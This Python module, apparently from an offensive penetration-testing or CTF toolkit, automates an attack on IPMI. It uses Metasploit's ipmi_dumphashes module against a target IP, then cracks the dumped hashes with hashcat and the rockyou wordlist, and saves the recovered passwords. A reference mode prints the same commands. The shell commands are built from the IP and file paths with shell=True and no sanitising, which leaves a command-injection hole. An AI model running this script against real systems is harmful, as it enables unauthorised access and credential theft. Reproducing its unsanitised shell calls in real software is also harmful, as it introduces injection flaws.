import shutil
import subprocess

from core.paths import (
    get_artifacts_dir
)


PROVIDES = []
REQUIRES = ["ip"]


def run(data, cred, args):

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'
    R = '\033[91m'
    M = '\033[95m'

    reference = getattr(
        args,
        "reference",
        False
    )

    # -----------------------------
    # REFERENCE
    # -----------------------------

    if reference:

        print(
            f"\n{B}┌── REFERENCE "
            f"──────────────────────────────────────┐{W}"
        )

        print()

        print(
            f"{Y}use auxiliary/scanner/ipmi/ipmi_dumphashes{W}"
        )

        print()

        print(
            f"{Y}set rhosts {M}<IP>{W}"
        )

        print()

        print(
            f"{Y}run{W}"
        )

        print()

        print(
            f"{Y}hashcat "
            f"-m 7300 "
            f"hashes.txt "
            f"rockyou.txt{W}"
        )

        print()

        print(
            f"{Y}hashcat "
            f"-m 7300 "
            f"hashes.txt "
            f"--show{W}"
        )

        print(
            f"\n{B}└──────────────────────────────────────────────┘{W}\n"
        )

        return

    # -----------------------------
    # TOOLS
    # -----------------------------

    if not shutil.which(
        "msfconsole"
    ):

        print(
            f"\n{R}[!]{W} "
            f"Metasploit not found."
        )

        return

    if not shutil.which(
        "hashcat"
    ):

        print(
            f"\n{R}[!]{W} "
            f"Hashcat not found."
        )

        return

    # -----------------------------
    # TARGET
    # -----------------------------

    ip = data.get(
        "ip"
    )

    if not ip:

        print(
            f"\n{R}[!]{W} "
            f"No target IP loaded."
        )

        return

    target_name = data.get(
        "name",
        "unknown"
    )

    # -----------------------------
    # ARTIFACTS
    # -----------------------------

    artifact_dir = (
        get_artifacts_dir(
            target_name
        )
        / "ipmi"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    hash_file = (
        artifact_dir
        / "hashes.txt"
    )

    dump_file = (
        artifact_dir
        / "dumphashes.txt"
    )

    cracked_file = (
        artifact_dir
        / "cracked.txt"
    )

    # -----------------------------
    # HEADER
    # -----------------------------

    print(
        f"\n{B}┌── MODULE: IPMI HASH DUMP "
        f"────────────────────┐{W}"
    )

    print(
        f"{B}│{W} "
        f"TARGET: "
        f"{C}{ip:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└───────────────────────────────────────────────┘{W}"
    )

    # -----------------------------
    # DUMP HASHES
    # -----------------------------

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"DUMPING HASHES\n"
    )

    msf_cmd = (
        f'msfconsole -q -x "'
        f'use auxiliary/scanner/ipmi/ipmi_dumphashes; '
        f'set rhosts {ip}; '
        f'set OUTPUT_HASHCAT_FILE {hash_file}; '
        f'run; '
        f'exit"'
    )

    print(
        f"{Y}{msf_cmd}{W}\n"
    )

    result = subprocess.run(
        msf_cmd,
        shell=True,
        capture_output=True,
        text=True
    )

    output = (
        result.stdout
        + result.stderr
    )

    print(
        output
    )

    dump_file.write_text(
        output
    )

    # -----------------------------
    # HASH CHECK
    # -----------------------------

    if not hash_file.exists():

        print(
            f"\n{R}[!]{W} "
            f"No hashes recovered."
        )

        return

    if hash_file.stat().st_size == 0:

        print(
            f"\n{R}[!]{W} "
            f"Hash file empty."
        )

        return
    

    with open(hash_file, "r") as f:
        lines = f.readlines()

    cleaned = []

    for line in lines:

        line = line.strip()

        if not line:
            continue

        parts = line.split()

        if len(parts) >= 2:

            cleaned.append(parts[1])

    with open(hash_file, "w") as f:
        f.write("\n".join(cleaned))

    # -----------------------------
    # CRACK
    # -----------------------------

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"CRACKING HASHES\n"
    )

    hashcat_cmd = (
        f"hashcat "
        f"-m 7300 "
        f"--username "
        f"'{hash_file}' "
        f"/usr/share/wordlists/rockyou.txt "
        f"--quiet"
    )

    print(
        f"{Y}{hashcat_cmd}{W}\n"
    )

    subprocess.run(
        hashcat_cmd,
        shell=True
    )

    # -----------------------------
    # SHOW RESULTS
    # -----------------------------

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"RECOVERED CREDENTIALS\n"
    )

    show_cmd = (
        f"hashcat "
        f"-m 7300 "
        f"'{hash_file}' "
        f"--show"
    )

    result = subprocess.run(
        show_cmd,
        shell=True,
        capture_output=True,
        text=True
    )

    cracked = (
        result.stdout
        + result.stderr
    )

    if cracked.strip():

        print(
            cracked
        )

        cracked_file.write_text(
            cracked
        )

    else:

        print(
            f"{Y}No passwords recovered.{W}"
        )

    # -----------------------------
    # RESULTS
    # -----------------------------

    print()

    print(
        f"{G}[+]{W} "
        f"Artifacts:"
    )

    print(
        f"{C}{artifact_dir}{W}"
    )

    print()
